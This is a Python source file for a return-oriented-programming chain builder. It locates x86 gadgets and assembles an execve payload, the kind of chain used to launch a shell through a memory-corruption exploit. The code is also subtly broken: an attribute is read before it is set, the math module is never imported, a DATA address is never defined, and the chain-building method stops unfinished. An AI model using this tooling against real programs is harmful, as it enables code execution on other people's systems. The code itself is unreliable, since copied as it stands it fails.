from struct import pack
from GadgetFinder import *

class ExecveBuilder():
    def __init__(self, regs) -> None:
        self.regs = regs
        self.SRC = 'eax'
        self.DST = 'edx'
        self.init_gadgets = {}
        self.gadget_finder = GadgetFinder()
        self.gadgets

    def find_xor_src(self, stdout):
        instructions = []
        for src in self.regs:
            instructions.append(Instruction('xor ' + src + ', ' + src, ['esp']))

        self.gadget_finder.start(stdout, instructions)
        
        ins, gad = self.gadget_finder.find_lowest_complexity()
        self.SRC = ins.split(' ')[1][:-1]
        self.init_gadgets[ins] = gad
        self.gadget_finder.gadgets.clear()
        
    def find_mov_dst(self, stdout):
        instructions = []
        for dst in self.regs:
            if dst == self.SRC: continue
            instructions.append(Instruction('mov dword ptr [' + dst + '], ' + self.SRC, ['esp']))

        self.gadget_finder.start(stdout, instructions)

        ins, gad = self.gadget_finder.find_lowest_complexity()
        self.DST = ins.split('[')[1].split(']')[0]
        self.init_gadgets[ins] = gad


    def pad_pop_reg(self, reg, data):
        gadget = self.gadgets['pop ' + reg]
        p = pack('<I', gadget.address)
        for r in gadget.side_pops:
            if r == reg: p += data
            else: p += pack('<I', 0x41414141)
        return p
    

    def build_stack_str(self, p, s, offset):
        bound = math.ceil(len(s) / 4)
        for i in range(0, bound):
            p += self.pad_pop_reg(self.DST, self.DATA + offset + i*4)
            d = str.encode(s[i*4:i*4+4]) if i*4+4 <= len(s) else str.encode(s[i*4:len(s)]) + b'A' * (bound*4 - len(s))
            p += self.pad_pop_reg(self.SRC, d)
            p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC]
        
        p += self.pad_pop_reg(self.DST, self.DATA + offset + len(s))
        p += self.gadgets['xor ' + self.SRC + ", " + self.SRC]
        p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC]

        return p
    

    def build_chain(self, stdout):
        self.gadget_finder = GadgetFinder(self.init_gadgets)

        instructions = [
            Instruction('pop eax', ['esp']),
            Instruction('pop ebx', ['esp']),
            Instruction('pop ecx', ['esp']),
            Instruction('pop edx', ['esp']),
            Instruction('inc eax', ['esp'])
        ]

        if self.SRC != 'eax': instructions.append(Instruction('xor eax, eax', ['esp']))

        self.gadget_finder.start(stdout, instructions)
        self.gadgets = self.gadget_finder.gadgets



